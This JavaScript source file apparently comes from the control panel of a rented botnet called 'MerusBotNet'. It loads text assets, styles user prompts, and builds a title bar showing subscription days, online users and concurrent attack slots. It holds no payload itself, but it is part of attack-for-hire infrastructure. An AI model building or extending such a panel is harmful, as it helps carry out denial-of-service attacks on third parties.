const fs = require('fs')
const title = require('../utils/title')
const getDays = require('../utils/getDays')
const { adminPromtGradient } = require('../utils/gradients')
const gradient = require('gradient-string')
const config = require('../../config')
const CommonData = require('../common/data')

class Assets {
    assets = {}
    constructor() {
        for(const fileName of fs.readdirSync('assets').filter(x => x.endsWith('.txt'))) {
            this.assets[fileName.split('.txt')[0]] = fs.readFileSync('assets/' + fileName).toString()
        }
    }
    getAsset(name) {
        return this.assets[name]
    }
    getPromt(user) {
        if(user.csg && user.csg.length > 1) return gradient(user.csg)(`${user.username}`) + ": ".white
        if(user.admin) return adminPromtGradient(`${user.username}`) + ": ".white
        else return `${user.username}`.brightYellow + ": ".white
    }
    getTitle(client, clients, attacks, config) {
        if(!client.authorized) return title("Авторизация.");
        //if(!client.authorized) return title("PlusParser | Auth.");
        else {
            let slots = CommonData.attacks.filter(x => (x.network === client.user.network || client.user.network === config.GlobalNetworkName)).length
            let maxSlots = client.user.network === config.GlobalNetworkName ? config.maxConcs * (Object.keys(CommonData.servers).length - 1) : config.maxConcs
            return title(`MerusBotNet | [${client.user.admin ? "Admin" : "User"}] ${client.username} | Days: ${Math.round(getDays(client.user.endUnix))} | Online: ${clients.length} | ${client.user.network} - Slots: ${slots}/${maxSlots} Bot: 9847`);
        }
    }
}

module.exports = new Assets()